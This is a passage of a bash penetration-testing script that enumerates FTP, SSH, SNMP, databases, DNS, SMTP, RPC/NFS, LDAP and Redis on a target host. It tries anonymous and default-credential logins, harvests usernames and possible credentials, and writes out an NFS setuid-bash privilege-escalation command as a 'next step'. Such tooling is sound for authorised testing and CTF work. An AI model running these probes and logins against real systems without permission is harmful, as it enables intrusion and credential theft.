    progress_log "$target_dir" "DONE" "smb" ""
}

#--- FTP ENUMERATION ----------------------------------------------------------
enum_ftp() {
    local ip="$1"
    local port="$2"
    local target_dir="$3"
    local outdir="$target_dir/tcp/ftp"
    mkdir -p "$outdir"

    if is_phase_done "$target_dir" "ftp"; then
        info "FTP enum already done for $ip — skipping"
        return 0
    fi
    progress_log "$target_dir" "START" "ftp" "port=$port"

    info "FTP enumeration starting: $ip:$port"

    if ! check_tool nc; then
        warn "  nc (netcat) not found — FTP banner/anonymous checks will be skipped"
    else
        # --- Banner grab ---
        info "  → banner grab"
        # shellcheck disable=SC2016
        timeout "$FTP_TIMEOUT" bash -c 'printf "QUIT\r\n" | nc -w 5 "$1" "$2"' \
            -- "$ip" "$port" > "$outdir/banner.txt" 2>&1 || true

        # --- Anonymous login check ---
        info "  → anonymous login check"
        # shellcheck disable=SC2016
        timeout "$FTP_TIMEOUT" bash -c '
            (
                sleep 1; printf "USER anonymous\r\n";
                sleep 1; printf "PASS anonymous@test.com\r\n";
                sleep 1; printf "PASV\r\n";
                sleep 1; printf "LIST\r\n";
                sleep 2; printf "QUIT\r\n";
            ) | nc -w 10 "$1" "$2"
        ' -- "$ip" "$port" > "$outdir/anonymous_check.txt" 2>&1 || true
    fi

    # Check if anonymous login succeeded — anchor ^230 to avoid false positive on version strings
    if [[ -f "$outdir/anonymous_check.txt" ]] && \
       grep -qiE '^230 |Login successful|logged in' "$outdir/anonymous_check.txt" 2>/dev/null; then
        success "  ★ ANONYMOUS FTP LOGIN SUCCESSFUL on $ip:$port ★"
        echo "ANONYMOUS FTP LOGIN SUCCESSFUL" > "$outdir/ANONYMOUS_ACCESS.txt"
        quick_win "$target_dir" "ANONYMOUS FTP LOGIN SUCCESSFUL on $ip:$port" "printf 'USER anonymous\\r\\nPASS anonymous@test.com\\r\\nLIST\\r\\nQUIT\\r\\n' | nc -w 10 $ip $port"

        # Try to download everything with wget
        if check_tool wget; then
            info "  → mirroring FTP content (anonymous)"
            mkdir -p "$outdir/mirror"
            timeout 120 wget -r -l 3 --no-passive-ftp \
                "ftp://anonymous:anon@${ip}:${port}/" \
                -P "$outdir/mirror/" 2>&1 | tail -5 || true
        fi
    else
        info "  Anonymous login not available"
    fi

    # --- Nmap FTP scripts for deeper checks ---
    info "  → nmap FTP scripts"
    timeout 120 nmap --script=ftp-anon,ftp-bounce,ftp-syst \
        -p "$port" -oN "$outdir/nmap_ftp_scripts.txt" "$ip" 2>&1 | tail -5 || true

    # --- Flag known-vulnerable FTP banners ---
    if [[ -f "$outdir/banner.txt" ]]; then
        local ftp_banner
        ftp_banner=$(grep -iE 'vsftpd|proftpd|Serv-U|FileZilla|pure-ftpd|wu-ftpd|^220' "$outdir/banner.txt" 2>/dev/null | head -1)
        if [[ -n "$ftp_banner" ]]; then
            echo "FTP banner: $ftp_banner" > "$outdir/version_info.txt"
            local _ftp_banner_cmd="printf 'QUIT\\r\\n' | nc -w 5 $ip $port  # banner: $ftp_banner"
            if echo "$ftp_banner" | grep -qi 'vsftpd 2\.3\.4'; then
                success "  ★ vsftpd 2.3.4 BACKDOOR (CVE-2011-2523) on $ip:$port ★"
                quick_win "$target_dir" "FTP vsftpd 2.3.4 backdoor on $ip:$port" "$_ftp_banner_cmd"
            fi
            if echo "$ftp_banner" | grep -qiE 'ProFTPD 1\.3\.5[^0-9]'; then
                success "  ★ ProFTPD 1.3.5 mod_copy RCE (CVE-2015-3306) on $ip:$port ★"
                quick_win "$target_dir" "FTP ProFTPD 1.3.5 mod_copy on $ip:$port" "$_ftp_banner_cmd"
            fi
            if echo "$ftp_banner" | grep -qiE 'ProFTPD 1\.3\.3c'; then
                success "  ★ ProFTPD 1.3.3c backdoor (OSVDB-69562) on $ip:$port ★"
                quick_win "$target_dir" "FTP ProFTPD 1.3.3c backdoor on $ip:$port" "$_ftp_banner_cmd"
            fi
            if echo "$ftp_banner" | grep -qi 'Serv-U'; then
                warn "  Serv-U FTP detected — check CVE-2021-35211"
                quick_win "$target_dir" "FTP Serv-U detected on $ip:$port — check CVE-2021-35211" "$_ftp_banner_cmd"
            fi
        fi
    fi

    success "FTP enumeration complete for $ip:$port"
    progress_log "$target_dir" "DONE" "ftp" ""
}

#--- SSH ENUMERATION ----------------------------------------------------------
enum_ssh() {
    local ip="$1"
    local port="$2"
    local target_dir="$3"
    local outdir="$target_dir/tcp/ssh"
    mkdir -p "$outdir"

    if is_phase_done "$target_dir" "ssh"; then
        info "SSH enum already done for $ip — skipping"
        return 0
    fi
    progress_log "$target_dir" "START" "ssh" "port=$port"

    info "SSH enumeration starting: $ip:$port"

    # --- Version/Banner grab ---
    if check_tool nc; then
        info "  → banner grab"
        # shellcheck disable=SC2016
        timeout 10 bash -c 'echo "" | nc -w 5 "$1" "$2"' \
            -- "$ip" "$port" > "$outdir/banner.txt" 2>&1 || true
    fi

    # --- Nmap SSH scripts ---
    info "  → nmap SSH scripts"
    timeout 120 nmap --script=ssh2-enum-algos,ssh-hostkey,ssh-auth-methods \
        -p "$port" -oN "$outdir/nmap_ssh_scripts.txt" "$ip" 2>&1 | tail -5 || true

    # --- Note version for known vulnerabilities ---
    local ssh_version=""
    ssh_version=$(head -1 "$outdir/banner.txt" 2>/dev/null | tr -d '\r\n')
    if [[ -n "$ssh_version" ]]; then
        echo "SSH Version: $ssh_version" > "$outdir/version_info.txt"
        success "  SSH version: $ssh_version"

        # Flag old/vulnerable versions
        if echo "$ssh_version" | grep -qiE 'OpenSSH_[1-6]\.|OpenSSH_7\.[0-9]([^0-9]|$)|dropbear'; then
            warn "  ★ Potentially vulnerable SSH version: $ssh_version"
            quick_win "$target_dir" "POTENTIALLY VULNERABLE SSH: $ssh_version on $ip:$port" \
                "echo '' | nc -w 5 $ip $port  # banner: $ssh_version"
            warn "  → Next steps for vulnerable SSH:"
            warn "    searchsploit openssh $(echo "$ssh_version" | grep -oP 'OpenSSH_\K[0-9]+\.[0-9]+')"
            warn "    ssh-audit $ip -p $port               # detailed vuln report"
            warn "    ./crackr.sh --hydra ssh --target $ip  # if no creds yet"
        fi
    fi

    success "SSH enumeration complete for $ip:$port"
    progress_log "$target_dir" "DONE" "ssh" "version=${ssh_version:-unknown}"
}

#--- SNMP ENUMERATION ---------------------------------------------------------
enum_snmp() {
    local ip="$1"
    local port="$2"
    local target_dir="$3"
    local outdir="$target_dir/udp/snmp"
    mkdir -p "$outdir"

    if is_phase_done "$target_dir" "snmp"; then
        info "SNMP enum already done for $ip — skipping"
        return 0
    fi
    progress_log "$target_dir" "START" "snmp" "port=$port"

    info "SNMP enumeration starting: $ip:$port"

    # --- Brute-force community strings with onesixtyone ---
    if check_tool onesixtyone; then
        info "  → onesixtyone community string brute"
        # Create temp community list
        local comm_file=""
        comm_file=$(mktemp)
        printf '%s\n' "${SNMP_COMMUNITY_STRINGS[@]}" > "$comm_file"
        # Also try the kali default list if it exists
        if [[ -f /usr/share/seclists/Discovery/SNMP/common-snmp-community-strings-onesixtyone.txt ]]; then
            cat /usr/share/seclists/Discovery/SNMP/common-snmp-community-strings-onesixtyone.txt >> "$comm_file"
        elif [[ -f /usr/share/metasploit-framework/data/wordlists/snmp_default_pass.txt ]]; then
            cat /usr/share/metasploit-framework/data/wordlists/snmp_default_pass.txt >> "$comm_file"
        fi
        sort -u "$comm_file" -o "$comm_file"
        timeout 60 onesixtyone -c "$comm_file" "$ip" \
            > "$outdir/onesixtyone.txt" 2>&1 || true
        rm -f "$comm_file"

        # Check for found community strings
        local found_strings=""
        found_strings=$(grep -oP '\[\K[^\]]+' "$outdir/onesixtyone.txt" 2>/dev/null | sort -u)
        if [[ -n "$found_strings" ]]; then
            success "  ★ Found SNMP community string(s): $found_strings"
            echo "$found_strings" > "$outdir/valid_community_strings.txt"
            quick_win "$target_dir" "SNMP community strings found on $ip: $found_strings" \
                "onesixtyone -c <community-list> $ip  # strings: $found_strings"

            if check_tool snmp-check; then
                local found_community
                while IFS= read -r found_community; do
                    [[ -z "$found_community" ]] && continue
                    info "  → snmp-check $ip (community: $found_community)"
                    timeout "$SNMPWALK_TIMEOUT" snmp-check "$ip" -c "$found_community" \
                        > "$outdir/snmpcheck_${found_community}.txt" 2>&1 || true
                done <<< "$found_strings"
            fi
        fi
    fi

    # --- SNMPwalk with common community strings ---
    if check_tool snmpwalk; then
        for community in "${SNMP_COMMUNITY_STRINGS[@]}"; do
            info "  → snmpwalk $ip (community: $community)"

            # SNMPv1
            timeout "$SNMPWALK_TIMEOUT" snmpwalk -v1 -c "$community" "$ip" \
                > "$outdir/snmpwalk_v1_${community}.txt" 2>&1 || true

            # SNMPv2c
            timeout "$SNMPWALK_TIMEOUT" snmpwalk -v2c -c "$community" "$ip" \
                > "$outdir/snmpwalk_v2c_${community}.txt" 2>&1 || true

            # Check if we got useful output (not just errors)
            if [[ -s "$outdir/snmpwalk_v2c_${community}.txt" ]] && \
               ! grep -q 'Timeout\|No Response' "$outdir/snmpwalk_v2c_${community}.txt" 2>/dev/null; then
                success "  ★ SNMP accessible with community '$community' (v2c)"

                # Targeted OID walks for juicy info
                info "  → extracting system info, processes, software, network info..."

                # System info
                timeout 30 snmpwalk -v2c -c "$community" "$ip" \
                    1.3.6.1.2.1.1 > "$outdir/system_info.txt" 2>&1 || true

                # Running processes
                timeout 60 snmpwalk -v2c -c "$community" "$ip" \
                    1.3.6.1.2.1.25.4.2.1.2 > "$outdir/running_processes.txt" 2>&1 || true

                # Installed software
                timeout 60 snmpwalk -v2c -c "$community" "$ip" \
                    1.3.6.1.2.1.25.6.3.1.2 > "$outdir/installed_software.txt" 2>&1 || true

                # TCP listening ports
                timeout 30 snmpwalk -v2c -c "$community" "$ip" \
                    1.3.6.1.2.1.6.13.1.3 > "$outdir/tcp_ports.txt" 2>&1 || true

                # Network interfaces
                timeout 30 snmpwalk -v2c -c "$community" "$ip" \
                    1.3.6.1.2.1.2.2.1.2 > "$outdir/network_interfaces.txt" 2>&1 || true

                # ARP table (find other hosts)
                timeout 30 snmpwalk -v2c -c "$community" "$ip" \
                    1.3.6.1.2.1.4.22.1.2 > "$outdir/arp_table.txt" 2>&1 || true

                # Process command-line arguments (may contain cleartext creds like mysql -u root -pSecret)
                timeout 60 snmpwalk -v2c -c "$community" "$ip" \
                    1.3.6.1.2.1.25.4.2.1.5 > "$outdir/process_args.txt" 2>&1 || true

                # Windows user accounts via SNMP
                timeout 30 snmpwalk -v2c -c "$community" "$ip" \
                    1.3.6.1.4.1.77.1.2.25 > "$outdir/windows_users.txt" 2>&1 || true

                # Flag process args containing potential credentials
                if [[ -s "$outdir/process_args.txt" ]] && \
                   grep -qiE 'pass|pwd|secret|key|token|cred' "$outdir/process_args.txt" 2>/dev/null; then
                    success "  ★ Process command-line args may contain credentials!"
                    quick_win "$target_dir" "SNMP process args may contain credentials on $ip — see $outdir/process_args.txt" \
                        "snmpwalk -v2c -c $community $ip 1.3.6.1.2.1.25.4.2.1.5"
                fi

                break  # Found working string, don't need to try more
            fi
        done
    fi

    success "SNMP enumeration complete for $ip"
    progress_log "$target_dir" "DONE" "snmp" ""
}

#--- MYSQL ENUMERATION --------------------------------------------------------
enum_mysql() {
    local ip="$1"
    local port="$2"
    local target_dir="$3"
    local outdir="$target_dir/tcp/mysql"
    mkdir -p "$outdir"

    if is_phase_done "$target_dir" "mysql_${port}"; then
        info "MySQL enum already done for $ip:$port — skipping"
        return 0
    fi
    progress_log "$target_dir" "START" "mysql_${port}" ""

    info "MySQL enumeration starting: $ip:$port"

    # --- Banner/version ---
    if check_tool nc; then
        info "  → banner grab"
        # shellcheck disable=SC2016
        timeout 10 bash -c 'echo "" | nc -w 5 "$1" "$2"' \
            -- "$ip" "$port" > "$outdir/banner.txt" 2>&1 || true
    fi

    # --- Nmap MySQL scripts ---
    info "  → nmap MySQL scripts"
    timeout 120 nmap --script=mysql-info,mysql-enum,mysql-empty-password,mysql-databases \
        -p "$port" -oN "$outdir/nmap_mysql_scripts.txt" "$ip" 2>&1 | tail -5 || true

    # Check for empty password root login
    if grep -qi 'empty password' "$outdir/nmap_mysql_scripts.txt" 2>/dev/null; then
        success "  ★ MySQL EMPTY PASSWORD found on $ip:$port ★"
        quick_win "$target_dir" "MySQL EMPTY PASSWORD on $ip:$port" \
            "nmap --script=mysql-info,mysql-enum,mysql-empty-password,mysql-databases -p $port $ip -oN $outdir/nmap_mysql_scripts.txt"
    fi

    # --- Try anonymous/root login ---
    if check_tool mysql; then
        info "  → trying root with no password"
        timeout "$MYSQL_TIMEOUT" mysql -h "$ip" -P "$port" -u root --password='' \
            -e "SELECT version(); SHOW DATABASES; SELECT user,host FROM mysql.user;" \
            > "$outdir/root_nopass.txt" 2>&1 || true
        if ! grep -qi 'ERROR\|denied\|refused' "$outdir/root_nopass.txt" 2>/dev/null && \
           [[ -s "$outdir/root_nopass.txt" ]]; then
            success "  ★ MySQL ROOT NO-PASSWORD LOGIN SUCCESSFUL ★"
            quick_win "$target_dir" "MySQL ROOT NO-PASSWORD LOGIN on $ip:$port" \
                "mysql -h $ip -P $port -u root --password='' -e 'SELECT version(); SHOW DATABASES;'"
        fi
    fi

    success "MySQL enumeration complete for $ip:$port"
    progress_log "$target_dir" "DONE" "mysql_${port}" ""
}

#--- MSSQL ENUMERATION --------------------------------------------------------
enum_mssql() {
    local ip="$1"
    local port="$2"
    local target_dir="$3"
    local outdir="$target_dir/tcp/mssql"
    mkdir -p "$outdir"

    if is_phase_done "$target_dir" "mssql_${port}"; then
        info "MSSQL enum already done for $ip:$port — skipping"
        return 0
    fi
    progress_log "$target_dir" "START" "mssql_${port}" ""

    info "MSSQL enumeration starting: $ip:$port"

    # --- Nmap MSSQL scripts ---
    info "  → nmap MSSQL scripts"
    timeout 180 nmap --script=ms-sql-info,ms-sql-ntlm-info,ms-sql-empty-password \
        -p "$port" -oN "$outdir/nmap_mssql_scripts.txt" "$ip" 2>&1 | tail -5 || true

    if grep -qiE 'empty password|sa.*<empty>' "$outdir/nmap_mssql_scripts.txt" 2>/dev/null; then
        success "  ★ MSSQL EMPTY PASSWORD (sa) on $ip:$port ★"
        quick_win "$target_dir" "MSSQL EMPTY PASSWORD (sa) on $ip:$port" \
            "nmap --script=ms-sql-info,ms-sql-ntlm-info,ms-sql-empty-password -p $port $ip -oN $outdir/nmap_mssql_scripts.txt"
    fi

    # --- Try default sa credentials (same pattern as enum_mysql / enum_postgres) ---
    local mssql_cmd=""
    if check_tool impacket-mssqlclient; then
        mssql_cmd="impacket-mssqlclient"
    elif check_tool mssqlclient.py; then
        mssql_cmd="mssqlclient.py"
    fi

    if [[ -n "$mssql_cmd" ]]; then
        local pass
        for pass in '' sa password Password1 sql admin; do
            info "  → trying sa:${pass:-<empty>}"
            timeout 20 "$mssql_cmd" "sa:${pass}@${ip}" -port "$port" \
                -q 'SELECT @@version;' \
                > "$outdir/login_sa_${pass:-empty}.txt" 2>&1 < /dev/null || true
            if grep -qiE 'Microsoft|SQL Server' "$outdir/login_sa_${pass:-empty}.txt" 2>/dev/null && \
               ! grep -qiE 'Login failed|authentication failed|ERROR' "$outdir/login_sa_${pass:-empty}.txt" 2>/dev/null; then
                success "  ★ MSSQL LOGIN: sa:${pass:-<empty>} on $ip:$port ★"
                quick_win "$target_dir" "MSSQL LOGIN: sa:${pass:-<empty>} on $ip:$port" \
                    "$mssql_cmd 'sa:${pass}@${ip}' -port $port -q 'SELECT @@version;'"
                break
            fi
        done
    fi

    success "MSSQL enumeration complete for $ip:$port"
    progress_log "$target_dir" "DONE" "mssql_${port}" ""
}

#--- POSTGRESQL ENUMERATION ---------------------------------------------------
enum_postgres() {
    local ip="$1"
    local port="$2"
    local target_dir="$3"
    local outdir="$target_dir/tcp/postgres"
    mkdir -p "$outdir"

    if is_phase_done "$target_dir" "postgres_${port}"; then
        info "PostgreSQL enum already done for $ip:$port — skipping"
        return 0
    fi
    progress_log "$target_dir" "START" "postgres_${port}" ""

    info "PostgreSQL enumeration starting: $ip:$port"

    # --- Nmap scripts ---
    info "  → nmap PostgreSQL scripts"
    timeout 120 nmap --script=pgsql-brute \
        --script-args='pgsql-brute.threads=5' \
        -p "$port" -oN "$outdir/nmap_pgsql_scripts.txt" "$ip" 2>&1 | tail -5 || true

    # --- Try default credentials ---
    if check_tool psql; then
        for user in postgres admin; do
            for pass in postgres admin password ""; do
                info "  → trying $user:${pass:-<empty>}"
                PGPASSWORD="$pass" timeout "$MYSQL_TIMEOUT" psql \
                    -h "$ip" -p "$port" -U "$user" \
                    -c 'SELECT version();' -c '\l' -c 'SELECT usename FROM pg_user;' \
                    > "$outdir/login_${user}_${pass:-empty}.txt" 2>&1 || true
                if ! grep -qi 'FATAL\|refused\|denied\|error' \
                    "$outdir/login_${user}_${pass:-empty}.txt" 2>/dev/null && \
                   [[ -s "$outdir/login_${user}_${pass:-empty}.txt" ]]; then
                    success "  ★ PostgreSQL LOGIN: $user:${pass:-<empty>} on $ip:$port ★"
                    quick_win "$target_dir" "PostgreSQL LOGIN: $user:${pass:-<empty>} on $ip:$port" \
                        "PGPASSWORD='${pass}' psql -h $ip -p $port -U $user -c 'SELECT version();'"
                    break 2
                fi
            done
        done
    fi

    success "PostgreSQL enumeration complete for $ip:$port"
    progress_log "$target_dir" "DONE" "postgres_${port}" ""
}

#--- DNS ENUMERATION ----------------------------------------------------------
enum_dns() {
    local ip="$1"
    local port="$2"
    local target_dir="$3"
    local outdir="$target_dir/tcp/dns"
    mkdir -p "$outdir"

    if is_phase_done "$target_dir" "dns"; then
        info "DNS enum already done for $ip — skipping"
        return 0
    fi
    progress_log "$target_dir" "START" "dns" "port=$port"

    info "DNS enumeration starting: $ip:$port"

    # --- Version query ---
    if check_tool dig; then
        info "  → DNS version query"
        timeout 30 dig @"$ip" -p "$port" version.bind chaos txt \
            > "$outdir/version.txt" 2>&1 || true

        # --- Zone transfer attempt ---
        info "  → zone transfer attempt (need domain name — checking nmap output)"
        # Try to extract domain from nmap results
        local domain=""
        domain=$(grep -oP 'commonName=\K[^\s/]+' "$target_dir/scans/nmap_tcp.nmap" 2>/dev/null | head -1)
        if [[ -z "$domain" ]]; then
            domain=$(grep -oP 'Domain:\s*\K\S+' "$target_dir/scans/nmap_tcp.nmap" 2>/dev/null | head -1)
        fi
        if [[ -n "$domain" ]]; then
            info "  → attempting zone transfer for $domain"
            timeout 30 dig @"$ip" -p "$port" "$domain" axfr \
                > "$outdir/zone_transfer_${domain}.txt" 2>&1 || true
            if check_tool dnsrecon; then
                info "  → dnsrecon for $domain via $ip"
                timeout "$GENERIC_TIMEOUT" dnsrecon -d "$domain" -n "$ip" \
                    > "$outdir/dnsrecon_${domain}.txt" 2>&1 || true
            fi
            if grep -q 'XFR size' "$outdir/zone_transfer_${domain}.txt" 2>/dev/null; then
                success "  ★ DNS ZONE TRANSFER SUCCESSFUL for $domain ★"
                quick_win "$target_dir" "DNS ZONE TRANSFER SUCCESSFUL: $domain via $ip" \
                    "dig @$ip -p $port $domain axfr"
            fi
        else
            info "  No domain found for zone transfer — try manually if you discover one"
            echo "# Run manually: dig @$ip <DOMAIN> axfr" > "$outdir/zone_transfer_manual.txt"
        fi
    fi

    # --- Nmap DNS scripts ---
    info "  → nmap DNS scripts"
    timeout 120 nmap --script=dns-nsid,dns-service-discovery,dns-recursion \
        -p "$port" -oN "$outdir/nmap_dns_scripts.txt" "$ip" 2>&1 | tail -5 || true

    success "DNS enumeration complete for $ip"
    progress_log "$target_dir" "DONE" "dns" ""
}

#--- SMTP ENUMERATION ---------------------------------------------------------
enum_smtp() {
    local ip="$1"
    local port="$2"
    local target_dir="$3"
    local outdir="$target_dir/tcp/smtp"
    mkdir -p "$outdir"

    if is_phase_done "$target_dir" "smtp_${port}"; then
        info "SMTP enum already done for $ip:$port — skipping"
        return 0
    fi
    progress_log "$target_dir" "START" "smtp_${port}" ""

    info "SMTP enumeration starting: $ip:$port"

    # --- Banner ---
    if check_tool nc; then
        info "  → banner grab"
        # shellcheck disable=SC2016
        timeout 15 bash -c 'printf "QUIT\r\n" | nc -w 5 "$1" "$2"' \
            -- "$ip" "$port" > "$outdir/banner.txt" 2>&1 || true
    fi

    # --- Nmap SMTP scripts (VRFY, EXPN, relay check) ---
    info "  → nmap SMTP scripts"
    timeout 180 nmap --script=smtp-commands,smtp-enum-users,smtp-open-relay \
        -p "$port" -oN "$outdir/nmap_smtp_scripts.txt" "$ip" 2>&1 | tail -5 || true

    # --- VRFY user enumeration (host-level, runs once regardless of how many SMTP ports exist) ---
    # Sentinel prevents duplicate VRFY runs when both port 25 and 587 are open.
    local vrfy_sentinel="$target_dir/tcp/smtp/vrfy_done"
    if [[ ! -f "$vrfy_sentinel" ]]; then
        info "  → SMTP VRFY enumeration (host-level, port $port)"
        local users_file="/usr/share/seclists/Usernames/Names/names.txt"
        if [[ ! -f "$users_file" ]]; then
            users_file="/usr/share/wordlists/metasploit/unix_users.txt"
        fi
        if [[ -f "$users_file" ]] && check_tool nc; then
            # shellcheck disable=SC2016
            timeout 120 bash -c '
                ip="$1"; port="$2"; users_file="$3"
                while IFS= read -r user; do
                    response=$(printf "VRFY %s\r\nQUIT\r\n" "$user" | nc -w 3 "$ip" "$port" 2>/dev/null)
                    # Drop the 220 greeting and 221 QUIT reply before the match
                    # so only the VRFY response is evaluated. Accept only 250/251
                    # (user exists / will-forward); 252 ("cannot VRFY but will
                    # accept") is NOT a confirmation and must not flag a user valid.
                    vrfy_reply=$(printf "%s\n" "$response" | grep -vE "^22[01]")
                    if printf "%s\n" "$vrfy_reply" | grep -qE "^25[01]"; then
                        echo "VALID: $user — $vrfy_reply"
                    fi
                done < <(head -100 "$users_file")
            ' -- "$ip" "$port" "$users_file" > "$outdir/vrfy_users.txt" 2>&1 || true

            local valid_count=""
            valid_count=$(grep -c "^VALID:" "$outdir/vrfy_users.txt" 2>/dev/null); valid_count=${valid_count:-0}
            if (( valid_count > 0 )); then
                success "  ★ Found $valid_count valid SMTP user(s) via port $port"
                quick_win "$target_dir" "SMTP VRFY found $valid_count valid users on $ip (via port $port)" \
                    "while read u; do printf 'VRFY %s\\r\\nQUIT\\r\\n' \"\$u\" | nc -w 3 $ip $port; done < <(head -100 $users_file)  # saw $valid_count 2xx responses"
            fi
            touch "$vrfy_sentinel"
        fi
    else
        info "  → SMTP VRFY already completed (host-level sentinel found) — skipping on port $port"
    fi

    success "SMTP enumeration complete for $ip:$port"
    progress_log "$target_dir" "DONE" "smtp_${port}" ""
}

#--- RPC ENUMERATION ----------------------------------------------------------
enum_rpc() {
    local ip="$1"
    local port="$2"
    local target_dir="$3"
    local outdir="$target_dir/tcp/rpc"
    mkdir -p "$outdir"

    if is_phase_done "$target_dir" "rpc"; then
        info "RPC enum already done for $ip — skipping"
        return 0
    fi
    progress_log "$target_dir" "START" "rpc" "port=$port"

    info "RPC enumeration starting: $ip:$port"

    # --- rpcclient (null session) ---
    if check_tool rpcclient; then
        info "  → rpcclient null session"
        timeout 60 rpcclient -U '' -N "$ip" -c \
            'srvinfo; enumdomusers; enumdomgroups; getdompwinfo; querydispinfo' \
            > "$outdir/rpcclient_null.txt" 2>&1 || true
    fi

    # --- rpcinfo ---
    if check_tool rpcinfo; then
        info "  → rpcinfo"
        timeout 30 rpcinfo -p "$ip" > "$outdir/rpcinfo.txt" 2>&1 || true
    fi

    # --- Check for NFS shares ---
    if check_tool showmount; then
        info "  → showmount (NFS exports)"
        timeout 30 showmount -e "$ip" > "$outdir/nfs_exports.txt" 2>&1 || true
        # Look for actual export lines (paths starting with /) rather than
        # using inverted grep which false-positives on header lines
        if grep -qP '^\s*/' "$outdir/nfs_exports.txt" 2>/dev/null; then
            success "  ★ NFS exports found on $ip ★"
            quick_win "$target_dir" "NFS EXPORTS on $ip:" "showmount -e $ip"
            grep -P '^\s*/' "$outdir/nfs_exports.txt" >> "$target_dir/loot/quick_wins.txt"
            while IFS= read -r export_line; do
                local export_path
                export_path=$(echo "${export_line}" | awk '{print $1}')
                [[ -z "${export_path}" ]] && continue
                echo "NEXT: mkdir /mnt/nfs_${ip//\./_} && mount -t nfs ${ip}:${export_path} /mnt/nfs_${ip//\./_}" \
                    >> "$target_dir/loot/quick_wins.txt"
                echo "NEXT (no_root_squash): cp /bin/bash /mnt/nfs_${ip//\./_}/bash && chmod +s /mnt/nfs_${ip//\./_}/bash && /mnt/nfs_${ip//\./_}/bash -p" \
                    >> "$target_dir/loot/quick_wins.txt"
            done < <(grep -P '^\s*/' "$outdir/nfs_exports.txt" 2>/dev/null | head -3)
        fi
    fi

    success "RPC enumeration complete for $ip"
    progress_log "$target_dir" "DONE" "rpc" ""
}

#--- LDAP ENUMERATION ---------------------------------------------------------
enum_ldap() {
    local ip="$1"
    local port="$2"
    local target_dir="$3"
    local outdir="$target_dir/tcp/ldap"
    mkdir -p "$outdir"

    if is_phase_done "$target_dir" "ldap"; then
        info "LDAP enum already done for $ip — skipping"
        return 0
    fi
    progress_log "$target_dir" "START" "ldap" "port=$port"

    info "LDAP enumeration starting: $ip:$port"

    # --- Nmap LDAP scripts ---
    info "  → nmap LDAP scripts"
    timeout 120 nmap --script=ldap-rootdse,ldap-search \
        -p "$port" -oN "$outdir/nmap_ldap_scripts.txt" "$ip" 2>&1 | tail -5 || true

    # --- ldapsearch (anonymous bind) ---
    if check_tool ldapsearch; then
        info "  → ldapsearch anonymous bind"
        # Get naming contexts first
        timeout 30 ldapsearch -x -H "ldap://${ip}:${port}" -s base \
            namingContexts > "$outdir/naming_contexts.txt" 2>&1 || true

        local base_dn=""
        base_dn=$(grep -oP 'namingContexts:\s*\K.*' "$outdir/naming_contexts.txt" 2>/dev/null | head -1)
        if [[ -n "$base_dn" ]]; then
            info "  → full anonymous dump (base: $base_dn)"
            timeout 120 ldapsearch -x -H "ldap://${ip}:${port}" -b "$base_dn" \
                > "$outdir/ldap_full_dump.txt" 2>&1 || true
            local entry_count=""
            entry_count=$(grep -c '^dn:' "$outdir/ldap_full_dump.txt" 2>/dev/null); entry_count=${entry_count:-0}
            if (( entry_count > 0 )); then
                success "  ★ LDAP anonymous bind: $entry_count entries found"
                quick_win "$target_dir" "LDAP anonymous bind on $ip: $entry_count entries" \
                    "ldapsearch -x -H ldap://${ip}:${port} -b '${base_dn}'"
                {
                    echo "NEXT: ldapsearch -x -H ldap://${ip}:${port} -b '${base_dn}' '(objectClass=*)' | grep -iE 'sAMAccountName|mail|description|memberOf'"
                    echo "NEXT (if domain-joined): ./adr.sh -d <DOMAIN> -u '' -p '' -dc ${ip}"
                } >> "$target_dir/loot/quick_wins.txt"

                # Extract sAMAccountName values for downstream spraying / Kerberos roasting
                mkdir -p "$target_dir/loot"
                local ldap_users_file="$target_dir/loot/ldap_users.txt"
                grep -oP '^sAMAccountName:\s*\K\S+' "$outdir/ldap_full_dump.txt" 2>/dev/null | \
                    grep -vE '\$$|^(krbtgt|Guest)$' | sort -u > "$ldap_users_file" || true
                if is_nonempty_file "$ldap_users_file"; then
                    local ldap_ucount
                    ldap_ucount=$(wc -l < "$ldap_users_file" 2>/dev/null); ldap_ucount=${ldap_ucount:-0}
                    success "  ★ Extracted $ldap_ucount usernames → loot/ldap_users.txt"
                    quick_win "$target_dir" "LDAP extracted $ldap_ucount usernames → $ldap_users_file" \
                        "grep -oP '^sAMAccountName:\\s*\\K\\S+' $outdir/ldap_full_dump.txt | grep -vE '\\\$\$|^(krbtgt|Guest)\$' | sort -u"
                fi
            fi
        fi
    fi

    success "LDAP enumeration complete for $ip"
    progress_log "$target_dir" "DONE" "ldap" ""
}

#--- REDIS ENUMERATION --------------------------------------------------------
enum_redis() {
    local ip="$1"
    local port="$2"
    local target_dir="$3"
    local outdir="$target_dir/tcp/redis"
    mkdir -p "$outdir"

    if is_phase_done "$target_dir" "redis_${port}"; then
        info "Redis enum already done for $ip:$port — skipping"
        return 0
    fi
    progress_log "$target_dir" "START" "redis_${port}" ""

    info "Redis enumeration starting: $ip:$port"

    # --- Info command (no auth check) ---
    if check_tool nc; then
        info "  → Redis INFO (no-auth check)"
        # shellcheck disable=SC2016
        timeout 15 bash -c 'printf "INFO\r\nQUIT\r\n" | nc -w 5 "$1" "$2"' \
            -- "$ip" "$port" > "$outdir/info_noauth.txt" 2>&1 || true

        if grep -qi 'redis_version' "$outdir/info_noauth.txt" 2>/dev/null; then
            success "  ★ Redis NO-AUTH ACCESS on $ip:$port ★"
            quick_win "$target_dir" "REDIS NO-AUTH on $ip:$port" \
                "printf 'INFO\\r\\nQUIT\\r\\n' | nc -w 5 $ip $port"

            # Get config and keys
            # shellcheck disable=SC2016
            timeout 15 bash -c 'printf "CONFIG GET *\r\nQUIT\r\n" | nc -w 5 "$1" "$2"' \
                -- "$ip" "$port" > "$outdir/config.txt" 2>&1 || true
            # shellcheck disable=SC2016
            timeout 15 bash -c 'printf "KEYS *\r\nQUIT\r\n" | nc -w 5 "$1" "$2"' \
                -- "$ip" "$port" > "$outdir/keys.txt" 2>&1 || true
        fi
    fi

    # --- Nmap scripts ---
    info "  → nmap Redis scripts"
    timeout 60 nmap --script=redis-info \
        -p "$port" -oN "$outdir/nmap_redis.txt" "$ip" 2>&1 | tail -3 || true

    success "Redis enumeration complete for $ip:$port"
    progress_log "$target_dir" "DONE" "redis_${port}" ""
}

#--- POP3 / IMAP ENUMERATION --------------------------------------------------
enum_pop3_imap() {
    local ip="$1"
    local port="$2"
    local target_dir="$3"
    local proto="$4"   # "pop3" or "imap"
    local outdir="$target_dir/tcp/${proto}"
    mkdir -p "$outdir"

    local phase_key="${proto}_${port}"
    if is_phase_done "$target_dir" "$phase_key"; then
        info "${proto^^} enum already done for $ip:$port — skipping"
        return 0
    fi
    progress_log "$target_dir" "START" "$phase_key" "port=$port"

